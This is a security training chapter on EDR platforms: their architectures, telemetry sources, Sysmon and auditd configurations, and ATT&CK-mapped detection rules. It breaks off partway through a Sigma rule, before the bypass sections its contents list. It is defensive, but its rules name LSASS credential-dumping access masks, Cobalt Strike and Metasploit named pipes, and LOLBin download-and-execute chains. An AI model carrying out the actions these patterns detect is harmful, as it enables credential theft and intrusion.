# 26 — Endpoint Detection and Response (EDR): Architecture, Operations, and Bypass Techniques

---

## Indice

1. [Fondamenti EDR](#1-fondamenti-edr)
2. [Architettura delle Piattaforme EDR](#2-architettura-delle-piattaforme-edr)
3. [Telemetria e Data Collection](#3-telemetria-e-data-collection)
4. [Detection Engineering per EDR](#4-detection-engineering-per-edr)
5. [Risposta agli Incidenti via EDR](#5-risposta-agli-incidenti-via-edr)
6. [EDR Bypass Techniques — Red Team Perspective](#6-edr-bypass-techniques--red-team-perspective)
7. [Hardening EDR Deployments](#7-hardening-edr-deployments)
8. [EDR in Ambienti Enterprise](#8-edr-in-ambienti-enterprise)
9. [XDR e il Futuro](#9-xdr-e-il-futuro)
10. [Laboratorio: EDR Deployment e Testing](#10-laboratorio-edr-deployment-e-testing)
11. [MDR: Managed Detection and Response](#11-mdr-managed-detection-and-response)
12. [BYOVD e Attacchi al Kernel EDR](#12-byovd-e-attacchi-al-kernel-edr)
13. [EDR per Workload Cloud e Container](#13-edr-per-workload-cloud-e-container)
14. [AI e GenAI nell'EDR Moderno](#14-ai-e-genai-nelledr-moderno)
15. [Valutazioni MITRE ATT&CK e Selezione EDR](#15-valutazioni-mitre-attck-e-selezione-edr)
16. [Playbook Operativi di Risposta EDR](#16-playbook-operativi-di-risposta-edr)
17. [Metriche e KPI per Operazioni EDR](#17-metriche-e-kpi-per-operazioni-edr)

---

## 1. Fondamenti EDR

### 1.1 Evoluzione Storica: AV → EPP → EDR → XDR

The endpoint security landscape has undergone a fundamental transformation across four distinct generations, each born from the failures of its predecessor.

**Generation 1 — Signature-Based Antivirus (1987–2005)**

Traditional antivirus operated on a simple principle: maintain a database of known-bad file hashes and byte patterns, scan files at rest and on-access, quarantine matches. This worked when malware authors produced hundreds of new samples per week. By 2005, the volume reached millions per day, rendering signature-only approaches structurally inadequate. The detection model was purely reactive — you could only detect what you had already seen.

**Generation 2 — Endpoint Protection Platforms (2005–2013)**

EPP solutions added heuristic engines, reputation scoring, and cloud-connected signature updates. Vendors introduced sandboxing (detonating suspicious files in isolated VMs), application whitelisting, and host-based intrusion prevention (HIPS). The critical limitation remained: EPP focused on prevention at the point of entry. If malware evaded the initial gate — via fileless techniques, trusted binary abuse, or zero-days — the platform had no visibility into post-compromise activity.

**Generation 3 — Endpoint Detection and Response (2013–2020)**

Anton Chuvakin coined "EDR" in 2013 to describe platforms that continuously record endpoint telemetry, enabling detection of adversary behaviors regardless of whether the initial payload was flagged. Core differentiators:

- Continuous recording of system events (not just file scans)
- Behavioral detection based on sequences of actions
- Retroactive hunting through stored telemetry
- Remote response capabilities (isolation, remediation)
- Threat intelligence integration for IOC enrichment

**Generation 4 — Extended Detection and Response (2020–present)**

XDR extends the EDR model across email, network, cloud workloads, and identity systems. The thesis: adversaries operate across domains, so detection must correlate signals across those same domains. XDR platforms ingest telemetry from endpoints, network devices, email gateways, cloud APIs, and identity providers into a unified data lake, applying cross-domain analytics.

### 1.2 Sorgenti di Telemetria

EDR agents instrument the operating system at multiple levels to capture security-relevant events:

| Telemetry Source | Events Captured | Detection Value |
|-----------------|-----------------|-----------------|
| Process creation | Parent-child relationships, command lines, image hashes | Living-off-the-land, LOLBin abuse |
| File I/O | Create, modify, delete, rename operations | Ransomware behavior, dropper activity |
| Registry operations | Key creation, modification, value changes | Persistence mechanisms, config tampering |
| Network connections | TCP/UDP connections, DNS queries, TLS metadata | C2 communication, lateral movement |
| API calls | Win32/NT API invocations, especially sensitive ones | Process injection, credential access |
| Memory operations | Allocations with RWX permissions, remote writes | Shellcode injection, reflective loading |
| Module loads | DLL/SO loading events, unsigned modules | DLL sideloading, injection |
| Authentication events | Logon/logoff, privilege escalation | Credential theft, privilege abuse |
| Named pipes | Pipe creation and connection events | C2 channels, inter-process communication |
| WMI/COM activity | WMI subscriptions, COM object instantiation | Persistence, lateral movement |

### 1.3 Metodologie di Rilevamento

**Signature-Based Detection**

Pattern matching against known indicators — file hashes (MD5/SHA256), byte sequences, YARA rules, Snort-style network signatures. Fast and precise (low false positives) but blind to novel threats. Still valuable for known commodity malware and as a first-pass filter.

**Heuristic Detection**

Static analysis of file properties without execution: entropy analysis (packed/encrypted sections), import table anomalies (suspicious API combinations), PE header malformations, string analysis. Assigns risk scores based on accumulated suspicious indicators.

**Behavioral Detection**

The backbone of modern EDR. Instead of examining artifacts in isolation, behavioral engines correlate sequences of events:

```
Process A (word.exe) →
  spawns Process B (cmd.exe) →
    executes encoded PowerShell →
      creates scheduled task →
        connects to external IP on port 443
```

Each individual event is legitimate. The sequence — a document editor spawning a shell that establishes persistence and C2 — constitutes a behavioral detection.

**Machine Learning Models**

EDR platforms deploy multiple ML model types:

- **Pre-execution static models**: Analyze PE structure, section characteristics, import tables to classify files before execution. Trained on millions of benign/malicious samples.
- **Runtime behavioral models**: Classify process behavior sequences using recurrent neural networks or gradient-boosted decision trees. Features include API call patterns, timing, resource access sequences.
- **Anomaly detection**: Unsupervised models establish per-endpoint behavioral baselines; flag deviations. Effective for detecting novel techniques but prone to false positives in dynamic environments.
- **NLP models on command lines**: Classify obfuscated PowerShell, cmd.exe, and bash command lines using character-level language models trained on known-malicious and benign commands.

---

## 2. Architettura delle Piattaforme EDR

### 2.1 CrowdStrike Falcon

**Architecture Overview**

CrowdStrike pioneered the cloud-native EDR model. The Falcon sensor is a lightweight kernel-mode driver (Windows) or kernel module (Linux/macOS) that streams raw telemetry to CrowdStrike's cloud-based Threat Graph.

```
┌─────────────────────────────────────────────────┐
│                  ENDPOINT                         │
│  ┌─────────────────────────────────────────┐    │
│  │         Falcon Sensor (User-mode)        │    │
│  │  ┌──────────┐  ┌────────────────────┐   │    │
│  │  │ML Engine │  │Behavioral Engine   │   │    │
│  │  │(local)   │  │(local indicators)  │   │    │
│  │  └──────────┘  └────────────────────┘   │    │
│  └──────────────────┬──────────────────────┘    │
│                     │                            │
│  ┌──────────────────┴──────────────────────┐    │
│  │    Kernel-Mode Filter Driver             │    │
│  │    (minifilter + ETW consumer)           │    │
│  └──────────────────┬──────────────────────┘    │
│                     │                            │
└─────────────────────┼────────────────────────────┘
                      │ Telemetry Stream (TLS 1.3)
                      ▼
┌─────────────────────────────────────────────────┐
│              CROWDSTRIKE CLOUD                    │
│  ┌────────────┐ ┌──────────┐ ┌──────────────┐  │
│  │Threat Graph│ │IOC Intel  │ │ML Models     │  │
│  │(Cassandra) │ │(real-time)│ │(cloud-side)  │  │
│  └────────────┘ └──────────┘ └──────────────┘  │
│  ┌────────────────────────────────────────────┐ │
│  │  Detection Logic + Response Orchestration   │ │
│  └────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────┘
```

**Key architectural decisions:**

- Single agent, no signature updates (cloud-side detection logic)
- Kernel filter driver intercepts system calls before they execute
- Local ML model provides offline detection capability
- Threat Graph stores relationships between processes, files, network connections across ALL customers (crowdsourced intelligence)
- ~5-15 MB/day telemetry per endpoint under normal conditions

### 2.2 Microsoft Defender for Endpoint (MDE)

**Architecture Overview**

MDE leverages deep Windows OS integration unavailable to third-party vendors:

- **Kernel-mode sensors**: Built into the Windows kernel (not a separate driver), providing tamper-resistant telemetry collection
- **ETW providers**: Microsoft owns the Event Tracing for Windows infrastructure; MDE consumes hundreds of ETW providers including undocumented internal ones
- **AMSI integration**: Antimalware Scan Interface provides visibility into script content at deobfuscation time
- **Credential Guard**: Hardware-isolated credential storage with EDR-visible access attempts
- **Cloud-delivered protection**: Real-time classification via Microsoft Intelligent Security Graph

```
┌────────────────────────────────────────────────┐
│                WINDOWS ENDPOINT                  │
│                                                  │
│  ┌──────────────────────────────────────────┐   │
│  │  Sense Service (MsSense.exe)              │   │
│  │  ├── Behavioral Blocking Engine           │   │
│  │  ├── Local ML Models                      │   │
│  │  ├── Memory Scanner (in-memory threats)   │   │
│  │  └── Network Protection                   │   │
│  └──────────────────┬───────────────────────┘   │
│                     │                            │
│  ┌──────────────────┴───────────────────────┐   │
│  │  Windows Defender kernel (WdFilter.sys)    │   │
│  │  ├── Minifilter (file operations)         │   │
│  │  ├── Object callbacks (process/thread)    │   │
│  │  ├── Registry callbacks                   │   │
│  │  └── Network filter (WFP callouts)        │   │
│  └──────────────────────────────────────────┘   │
│                                                  │
│  ┌──────────────────────────────────────────┐   │
│  │  AMSI (script content scanning)           │   │
│  │  ETW (hundreds of providers)              │   │
│  │  Secure Kernel (VBS-isolated ops)         │   │
│  └──────────────────────────────────────────┘   │
└────────────────────────────────────────────────┘
```

### 2.3 SentinelOne Singularity

SentinelOne differentiates through its autonomous response model — the agent makes kill/quarantine/rollback decisions locally without requiring cloud connectivity.

**Key architectural elements:**

- **Storyline technology**: Links related events into attack narratives using process genealogy and temporal correlation
- **Static AI engine**: Pre-execution file classification
- **Behavioral AI engine**: Runtime sequence analysis
- **ActiveEDR**: Every event is tagged with a Storyline ID, enabling instant correlation
- **Rollback capability**: Uses Windows Volume Shadow Copy to reverse ransomware damage

### 2.4 VMware Carbon Black (now Broadcom)

**Architecture distinctions:**

- Records ALL endpoint activity to a centralized server (not just suspicious events)
- Enables unlimited retroactive hunting through complete historical telemetry
- Heavy focus on application control (allow-listing) as a prevention layer
- Streaming prevention — applies cloud-delivered rules to local event stream

### 2.5 Elastic Endpoint Security

Built atop the Elastic stack (Elasticsearch + Kibana), providing:

- Open detection rules in the `elastic/detection-rules` repository
- YAML-based rule definitions mapped to MITRE ATT&CK
- Integration with Elastic SIEM for unified analytics
- Event Query Language (EQL) for behavioral pattern matching:

```eql
sequence by host.id with maxspan=1m
  [process where event.type == "start" and process.name == "cmd.exe"
   and process.parent.name == "winword.exe"]
  [network where destination.port == 443
   and not cidrmatch(destination.ip, "10.0.0.0/8")]
```

### 2.6 Wazuh HIDS (Open Source)

Wazuh provides enterprise-grade EDR capabilities without licensing costs:

```
┌──────────────────────────────────────────────────┐
│                  WAZUH ARCHITECTURE               │
│                                                    │
│  ┌────────────┐  ┌────────────┐  ┌────────────┐ │
│  │ Wazuh Agent│  │ Wazuh Agent│  │ Wazuh Agent│ │
│  │ (endpoint) │  │ (endpoint) │  │ (endpoint) │ │
│  └──────┬─────┘  └──────┬─────┘  └──────┬─────┘ │
│         │               │               │        │
│         └───────────────┼───────────────┘        │
│                         │ (TCP 1514/1515)         │
│                         ▼                         │
│  ┌──────────────────────────────────────────────┐│
│  │           Wazuh Manager/Server                ││
│  │  ├── Analysis Engine (rules + decoders)       ││
│  │  ├── FIM (File Integrity Monitoring)          ││
│  │  ├── Vulnerability Detection                  ││
│  │  ├── SCA (Security Config Assessment)         ││
│  │  └── Active Response Module                   ││
│  └──────────────────────┬───────────────────────┘│
│                         │                         │
│                         ▼                         │
│  ┌──────────────────────────────────────────────┐│
│  │     Wazuh Indexer (OpenSearch/Elasticsearch)  ││
│  │     Wazuh Dashboard (Kibana fork)             ││
│  └──────────────────────────────────────────────┘│
└──────────────────────────────────────────────────┘
```

**Agent capabilities:**
- Log collection and forwarding (syslog, Windows Event Log, application logs)
- File integrity monitoring (FIM) with real-time change detection
- Rootkit detection (checking /dev, hidden processes, kernel module verification)
- System inventory (packages, ports, processes)
- Command execution for active response
- Integration with Sysmon for enhanced Windows telemetry

### 2.7 Kernel-Level Hooks: The Foundation

All EDR platforms fundamentally depend on kernel-level visibility mechanisms:

**Windows: Kernel Callbacks and Minifilters**

```c
// Process creation notification callback
PsSetCreateProcessNotifyRoutineEx(ProcessNotifyCallback, FALSE);

// Thread creation notification
PsSetCreateThreadNotifyRoutine(ThreadNotifyCallback, FALSE);

// Image (DLL/EXE) load notification  
PsSetLoadImageNotifyRoutine(ImageLoadCallback);

// Object access callback (handle operations)
ObRegisterCallbacks(&CallbackRegistration, &RegistrationHandle);

// Registry change notification
CmRegisterCallbackEx(RegistryCallback, &Altitude, DriverObject, NULL, &Cookie, NULL);

// Minifilter for file operations
FltRegisterFilter(DriverObject, &FilterRegistration, &FilterHandle);
```

**Linux: eBPF (Extended Berkeley Packet Filter)**

Modern Linux EDR agents use eBPF to attach probes at kernel tracepoints without requiring kernel module compilation:

```c
// eBPF program attached to execve syscall tracepoint
SEC("tracepoint/syscalls/sys_enter_execve")
int trace_execve(struct trace_event_raw_sys_enter *ctx) {
    struct event_t event = {};
    event.pid = bpf_get_current_pid_tgid() >> 32;
    event.uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;
    
    // Read filename argument
    const char *filename = (const char *)ctx->args[0];
    bpf_probe_read_user_str(event.filename, sizeof(event.filename), filename);
    
    // Read argv[0]
    const char **argv = (const char **)ctx->args[1];
    const char *arg0;
    bpf_probe_read_user(&arg0, sizeof(arg0), &argv[0]);
    bpf_probe_read_user_str(event.arg0, sizeof(event.arg0), arg0);
    
    bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    return 0;
}
```

**macOS: Endpoint Security Framework (ESF)**

Apple deprecated kext-based security tools in favor of the Endpoint Security Framework:

```swift
// macOS Endpoint Security client
let client = try ESClient(handler: { client, message in
    switch message.event_type {
    case ES_EVENT_TYPE_NOTIFY_EXEC:
        let process = message.event.exec.target
        // Log process execution with full path, arguments, signing info
        
    case ES_EVENT_TYPE_AUTH_OPEN:
        let file = message.event.open.file
        // Authorize or deny file access
        
    case ES_EVENT_TYPE_NOTIFY_MMAP:
        let mmap = message.event.mmap
        // Monitor memory-mapped file operations (detect reflective loading)
        
    default: break
    }
    return ES_AUTH_RESULT_ALLOW
})
```

---

## 3. Telemetria e Data Collection

### 3.1 Windows ETW Architecture

Event Tracing for Windows (ETW) is the primary telemetry backbone for Windows-based EDR:

```
┌─────────────────────────────────────────────────────┐
│                    ETW ARCHITECTURE                   │
│                                                       │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐            │
│  │Provider A│ │Provider B│ │Provider C│ ...         │
│  │(kernel)  │ │(.NET CLR)│ │(PowerShell)│           │
│  └────┬─────┘ └────┬─────┘ └────┬─────┘            │
│       │             │             │                   │
│       ▼             ▼             ▼                   │
│  ┌──────────────────────────────────────────────┐   │
│  │              ETW Session (Kernel buffer)       │   │
│  │              (circular buffer, per-CPU)        │   │
│  └──────────────────────┬───────────────────────┘   │
│                         │                            │
│            ┌────────────┼────────────┐               │
│            ▼            ▼            ▼               │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐          │
│  │Consumer 1│  │Consumer 2│  │Consumer 3│          │
│  │(EDR svc) │  │(Sysmon)  │  │(PerfMon) │          │
│  └──────────┘  └──────────┘  └──────────┘          │
└─────────────────────────────────────────────────────┘
```

**Critical ETW providers for EDR:**

| Provider GUID | Name | Telemetry |
|--------------|------|-----------|
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | Process start/stop, image loads |
| `{A68CA8B7-004F-D7B6-A698-07E2DE0F1F5D}` | Microsoft-Windows-Kernel-Network | TCP/UDP connections |
| `{2CB15D1D-5FC1-11D2-ABE1-00A0C911F518}` | Microsoft-Windows-Kernel-Registry | Registry operations |
| `{EDD08927-9CC4-4E65-B970-C2560FB5C289}` | Microsoft-Windows-Kernel-File | File create/delete/rename |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Windows-PowerShell | Script block logging |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | Microsoft-Windows-DotNETRuntime | .NET assembly loads |
| `{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}` | Microsoft-Windows-LDAP-Client | LDAP queries |
| `{E6307A09-292C-497E-AAD6-498F68E2B619}` | Microsoft-Windows-DNS-Client | DNS resolution |

### 3.2 Sysmon Configuration and Event IDs

Sysmon (System Monitor) is a Windows device driver and service that logs detailed system activity. Properly configured, it provides EDR-grade telemetry to any SIEM.

**Critical Sysmon Event IDs:**

| Event ID | Description | Detection Value |
|----------|-------------|-----------------|
| 1 | Process creation | Full command line, hashes, parent process |
| 3 | Network connection | Source/dest IP and port, process context |
| 7 | Image loaded | DLL loads with hash and signature status |
| 8 | CreateRemoteThread | Cross-process thread injection |
| 10 | ProcessAccess | LSASS access, process manipulation |
| 11 | FileCreate | File drops, staging |
| 12/13/14 | Registry events | Persistence, config changes |
| 15 | FileCreateStreamHash | ADS (Alternate Data Streams) |
| 17/18 | Pipe created/connected | C2 channels, lateral movement |
| 22 | DNSEvent | DNS queries with process context |
| 23 | FileDelete (archived) | Evidence destruction detection |
| 25 | ProcessTampering | Image hollowing detection |
| 26 | FileDeleteDetected | Lightweight delete logging |
| 27 | FileBlockExecutable | Executable drop blocking |
| 28 | FileBlockShredding | Forensic evidence preservation |

**Production Sysmon Configuration (annotated):**

```xml
<Sysmon schemaversion="4.90">
  <HashAlgorithms>sha256,imphash</HashAlgorithms>
  <CheckRevocation>true</CheckRevocation>
  
  <EventFiltering>
    <!-- Process Creation: Log everything except high-noise legitimate processes -->
    <RuleGroup name="ProcessCreate" groupRelation="or">
      <ProcessCreate onmatch="exclude">
        <!-- Exclude high-frequency benign processes -->
        <Image condition="is">C:\Windows\System32\backgroundTaskHost.exe</Image>
        <Image condition="is">C:\Windows\System32\RuntimeBroker.exe</Image>
        <Image condition="is">C:\Windows\System32\taskhostw.exe</Image>
        <ParentImage condition="is">C:\Windows\System32\svchost.exe</ParentImage>
        <!-- But NEVER exclude svchost itself as parent - it's heavily abused -->
      </ProcessCreate>
    </RuleGroup>

    <!-- Network Connections: Focus on suspicious outbound -->
    <RuleGroup name="NetworkConnect" groupRelation="or">
      <NetworkConnect onmatch="include">
        <!-- Log connections from commonly abused processes -->
        <Image condition="end with">powershell.exe</Image>
        <Image condition="end with">cmd.exe</Image>
        <Image condition="end with">wscript.exe</Image>
        <Image condition="end with">cscript.exe</Image>
        <Image condition="end with">mshta.exe</Image>
        <Image condition="end with">regsvr32.exe</Image>
        <Image condition="end with">rundll32.exe</Image>
        <Image condition="end with">certutil.exe</Image>
        <Image condition="end with">bitsadmin.exe</Image>
        <!-- Log connections on non-standard ports -->
        <DestinationPort condition="is not">80</DestinationPort>
        <DestinationPort condition="is not">443</DestinationPort>
        <DestinationPort condition="is not">53</DestinationPort>
      </NetworkConnect>
    </RuleGroup>

    <!-- Process Access: Detect credential dumping -->
    <RuleGroup name="ProcessAccess" groupRelation="or">
      <ProcessAccess onmatch="include">
        <!-- LSASS access - credential theft indicator -->
        <TargetImage condition="end with">lsass.exe</TargetImage>
        <!-- Access to security-critical processes -->
        <TargetImage condition="end with">csrss.exe</TargetImage>
        <TargetImage condition="end with">winlogon.exe</TargetImage>
        <!-- Specific access masks for injection -->
        <GrantedAccess condition="is">0x1F0FFF</GrantedAccess>
        <GrantedAccess condition="is">0x1F1FFF</GrantedAccess>
        <GrantedAccess condition="is">0x143A</GrantedAccess>
        <GrantedAccess condition="is">0x1410</GrantedAccess>
      </ProcessAccess>
    </RuleGroup>

    <!-- CreateRemoteThread: Almost always malicious -->
    <RuleGroup name="CreateRemoteThread" groupRelation="or">
      <CreateRemoteThread onmatch="exclude">
        <!-- Only exclude known legitimate uses -->
        <SourceImage condition="is">C:\Windows\System32\csrss.exe</SourceImage>
        <SourceImage condition="is">C:\Windows\System32\lsass.exe</SourceImage>
        <SourceImage condition="is">C:\Windows\System32\services.exe</SourceImage>
      </CreateRemoteThread>
    </RuleGroup>

    <!-- Named Pipes: Detect C2 and lateral movement tools -->
    <RuleGroup name="PipeEvent" groupRelation="or">
      <PipeEvent onmatch="include">
        <!-- Cobalt Strike default named pipes -->
        <PipeName condition="begin with">\MSSE-</PipeName>
        <PipeName condition="begin with">\postex_</PipeName>
        <PipeName condition="begin with">\status_</PipeName>
        <!-- PsExec -->
        <PipeName condition="is">\PSEXESVC</PipeName>
        <!-- Metasploit -->
        <PipeName condition="begin with">\msf</PipeName>
        <!-- Common lateral movement -->
        <PipeName condition="begin with">\lsarpc</PipeName>
        <PipeName condition="begin with">\samr</PipeName>
      </PipeEvent>
    </RuleGroup>

    <!-- DNS Query Logging -->
    <RuleGroup name="DnsQuery" groupRelation="or">
      <DnsQuery onmatch="exclude">
        <QueryName condition="end with">.microsoft.com</QueryName>
        <QueryName condition="end with">.windowsupdate.com</QueryName>
        <QueryName condition="end with">.windows.com</QueryName>
      </DnsQuery>
    </RuleGroup>

    <!-- File Creation: Detect suspicious file writes -->
    <RuleGroup name="FileCreate" groupRelation="or">
      <FileCreate onmatch="include">
        <!-- Executable drops in temp/user directories -->
        <TargetFilename condition="contains">\AppData\Local\Temp\</TargetFilename>
        <TargetFilename condition="contains">\Downloads\</TargetFilename>
        <TargetFilename condition="end with">.exe</TargetFilename>
        <TargetFilename condition="end with">.dll</TargetFilename>
        <TargetFilename condition="end with">.scr</TargetFilename>
        <TargetFilename condition="end with">.ps1</TargetFilename>
        <TargetFilename condition="end with">.bat</TargetFilename>
        <TargetFilename condition="end with">.hta</TargetFilename>
        <!-- Startup folder persistence -->
        <TargetFilename condition="contains">\Start Menu\Programs\Startup\</TargetFilename>
      </FileCreate>
    </RuleGroup>

    <!-- Image Load: Detect DLL sideloading -->
    <RuleGroup name="ImageLoad" groupRelation="or">
      <ImageLoad onmatch="include">
        <!-- Unsigned DLLs loaded by signed processes -->
        <Signed condition="is">false</Signed>
        <!-- CLR loading (possible .NET injection) -->
        <ImageLoaded condition="end with">clr.dll</ImageLoaded>
        <ImageLoaded condition="end with">mscoree.dll</ImageLoaded>
        <!-- AMSI bypass indicators -->
        <ImageLoaded condition="end with">amsi.dll</ImageLoaded>
      </ImageLoad>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

### 3.3 Linux Audit Framework

**auditd Rules for EDR-Grade Telemetry:**

```bash
## /etc/audit/rules.d/edr-telemetry.rules

## Process execution monitoring
-a always,exit -F arch=b64 -S execve -F key=process_execution
-a always,exit -F arch=b32 -S execve -F key=process_execution

## File system monitoring - critical paths
-w /etc/passwd -p wa -k identity_file
-w /etc/shadow -p wa -k identity_file
-w /etc/sudoers -p wa -k privilege_escalation
-w /etc/sudoers.d/ -p wa -k privilege_escalation
-w /etc/crontab -p wa -k persistence
-w /etc/cron.d/ -p wa -k persistence
-w /var/spool/cron/ -p wa -k persistence

## SSH key monitoring
-w /root/.ssh/ -p wa -k ssh_keys
-w /home/ -p wa -k ssh_keys

## Kernel module loading
-a always,exit -F arch=b64 -S init_module -S finit_module -F key=kernel_modules
-a always,exit -F arch=b64 -S delete_module -F key=kernel_modules

## Privilege escalation
-a always,exit -F arch=b64 -S setuid -S setgid -S setreuid -S setregid -F key=priv_escalation
-a always,exit -F arch=b64 -S execve -F euid=0 -F auid>=1000 -F auid!=-1 -F key=root_execution

## Network connections (detect reverse shells)
-a always,exit -F arch=b64 -S connect -F key=network_connect
-a always,exit -F arch=b64 -S socket -F a0=2 -F key=network_socket
-a always,exit -F arch=b64 -S bind -F key=network_bind

## ptrace (process injection/debugging)
-a always,exit -F arch=b64 -S ptrace -F key=process_injection

## Memory mapping with executable permissions
-a always,exit -F arch=b64 -S mmap -F a2&0x4 -F key=exec_mmap
-a always,exit -F arch=b64 -S mprotect -F a2&0x4 -F key=exec_mprotect
```

**eBPF-Based Collection (modern alternative to auditd):**

```c
// BPF program for network connection monitoring
SEC("kprobe/tcp_v4_connect")
int trace_connect(struct pt_regs *ctx) {
    struct sock *sk = (struct sock *)PT_REGS_PARM1(ctx);
    struct event_t event = {};
    
    event.pid = bpf_get_current_pid_tgid() >> 32;
    bpf_get_current_comm(&event.comm, sizeof(event.comm));
    
    // Extract destination IP and port
    bpf_probe_read_kernel(&event.daddr, sizeof(event.daddr), &sk->__sk_common.skc_daddr);
    bpf_probe_read_kernel(&event.dport, sizeof(event.dport), &sk->__sk_common.skc_dport);
    
    bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    return 0;
}
```

### 3.4 Rilevamento di Tecniche Avanzate

**Process Hollowing Detection:**

Process hollowing involves creating a legitimate process in suspended state, unmapping its memory, writing malicious code, and resuming execution. Detection indicators in Sysmon/ETW:

1. Process created with `CREATE_SUSPENDED` flag (Event ID 1, parent with specific flags)
2. `NtUnmapViewOfSection` called on the new process
3. `WriteProcessMemory` to the remote process space
4. `SetThreadContext` to redirect execution
5. `ResumeThread` to start the hollowed process

Sysmon Event ID 25 (ProcessTampering) directly detects this when the on-disk image diverges from the in-memory image.

**DLL Injection Detection:**

```
Detection chain:
  1. OpenProcess with PROCESS_ALL_ACCESS on remote process (Sysmon 10)
  2. VirtualAllocEx in remote process with PAGE_EXECUTE_READWRITE
  3. WriteProcessMemory with DLL path or shellcode
  4. CreateRemoteThread targeting LoadLibraryA/W (Sysmon 8)
```

**Named Pipe Monitoring for C2:**

Cobalt Strike, Metasploit, and other frameworks use named pipes for inter-process communication. Detection patterns:

```xml
<!-- Sysmon rule for suspicious named pipes -->
<PipeEvent onmatch="include">
  <!-- Cobalt Strike variants -->
  <PipeName condition="begin with">\MSSE-</PipeName>
  <PipeName condition="begin with">\postex_</PipeName>
  <PipeName condition="begin with">\status_</PipeName>
  <PipeName condition="begin with">\msagent_</PipeName>
  <!-- Pattern: random hex pipe names (common in C2) -->
  <PipeName condition="begin with">\win_svc_</PipeName>
  <!-- Covenant C2 -->
  <PipeName condition="begin with">\gruntsvc</PipeName>
</PipeEvent>
```

---

## 4. Detection Engineering per EDR

### 4.1 MITRE ATT&CK Technique Coverage Mapping

A mature EDR deployment maps detection coverage against the ATT&CK matrix. Example coverage assessment:

```yaml
# detection_coverage.yaml
mitre_attack_coverage:
  initial_access:
    T1566.001:  # Spearphishing Attachment
      coverage: HIGH
      detections:
        - "Office spawning suspicious child process"
        - "Macro execution with network callback"
      gaps: "Encrypted attachments bypass content inspection"
    
  execution:
    T1059.001:  # PowerShell
      coverage: HIGH
      detections:
        - "Encoded PowerShell command"
        - "PowerShell downloading remote content"
        - "AMSI-logged suspicious script blocks"
      gaps: "PowerShell constrained language mode bypass"
    
    T1059.003:  # Windows Command Shell
      coverage: MEDIUM
      detections:
        - "cmd.exe spawned by unusual parent"
        - "Command line obfuscation patterns"
      gaps: "Short commands within normal operational patterns"
    
  persistence:
    T1053.005:  # Scheduled Task
      coverage: HIGH
      detections:
        - "schtasks.exe with suspicious command"
        - "Registry-based task creation"
        - "XML task file dropped to Tasks folder"
    
    T1547.001:  # Registry Run Keys
      coverage: HIGH
      detections:
        - "Registry modification to Run/RunOnce keys"
        - "Unsigned executable in startup paths"
    
  credential_access:
    T1003.001:  # LSASS Memory
      coverage: HIGH
      detections:
        - "Process accessing LSASS with suspicious access mask"
        - "Mimikatz signature in memory"
        - "Comsvcs.dll MiniDump of LSASS"
      gaps: "Direct syscall LSASS access from trusted process"
    
  lateral_movement:
    T1021.002:  # SMB/Windows Admin Shares
      coverage: MEDIUM
      detections:
        - "PsExec service installation"
        - "Remote service creation via SCM"
      gaps: "Legitimate admin tool usage patterns"
```

### 4.2 Behavioral Indicators of Compromise (BIOCs)

BIOCs define attack patterns as sequences of system behaviors rather than static artifacts:

```yaml
# BIOC: Credential Dumping via LSASS
bioc:
  name: "LSASS Memory Access - Credential Theft"
  mitre: T1003.001
  severity: CRITICAL
  logic:
    sequence:
      - event: process_access
        target_process: "lsass.exe"
        access_mask:
          - "0x1010"   # PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
          - "0x1410"   # + PROCESS_QUERY_LIMITED_INFORMATION
          - "0x1F0FFF" # PROCESS_ALL_ACCESS
          - "0x1F1FFF" # ALL_ACCESS variant
        source_process_not_in:
          - "C:\\Windows\\System32\\svchost.exe"
          - "C:\\Windows\\System32\\lsass.exe"
          - "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
    exceptions:
      - source_signed_by: "Microsoft Windows"
        source_process_path: "C:\\Windows\\System32\\*"
```

```yaml
# BIOC: Living-off-the-Land Binary Execution Chain
bioc:
  name: "LOLBin Download and Execute Chain"
  mitre: [T1218, T1105]
  severity: HIGH
  logic:
    sequence:
      - event: process_create
        process_name:
          any_of: [certutil.exe, bitsadmin.exe, curl.exe, wget.exe]
        command_line:
          contains_any: ["urlcache", "download", "transfer", "http"]
        within: 60s
      - event: file_create
        file_extension:
          any_of: [.exe, .dll, .scr, .ps1, .bat, .hta, .js, .vbs]
      - event: process_create
        image_path:
          matches_previous: file_create.target_path
```

### 4.3 Custom Detection Rules — Sigma Format

Sigma is the open standard for detection rules, translatable to any SIEM/EDR platform:

```yaml
title: Suspicious LSASS Access via Unsigned Process
id: a0b4f4c1-3e72-4d8a-9f11-2c3b5a7e8f90
status: stable
level: critical
description: |
  Detects access to LSASS process memory from unsigned executables,
  a strong indicator of credential dumping tools like Mimikatz.
references:
  - https://attack.mitre.org/techniques/T1003/001/
author: Detection Engineering Team
date: 2025-01-15
modified: 2025-03-20
tags:
  - attack.credential_access
  - attack.t1003.001
logsource:
  category: process_access
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|contains:
      - '0x1010'
      - '0x1410'
      - '0x1F0FFF'
      - '0x1F1FFF'
      - '0x143A'
  filter_legitimate:
    SourceImage|startswith:
      - 'C:\Windows\System32\'
      - 'C:\Program Files\Windows Defender\'
      - 'C:\Program Files (x86)\Microsoft\'
    SourceImage|endswith:
      - '\MsMpEng.exe'
      - '\csrss.exe'
      - '\wmiprvse.exe'
  filter_signed:
    SourceUser: 'NT AUTHORITY\SYSTEM'
    SourceImage|endswith: '\svchost.exe'
  condition: selection and not 1 of filter_*
falsepositives:
  - Legitimate security tools (add to filter)
  - Windows Update operations
```

```yaml
title: Encoded PowerShell Command Execution
id: f7c21ab8-ec54-4cf3-b22a-3e19bf8d4a01
status: stable
level: high
description: |
  Detects execution of PowerShell with Base64-encoded commands,
  commonly used by malware, post-exploitation frameworks, and
  fileless attacks to obfuscate payloads.
tags:
  - attack.execution
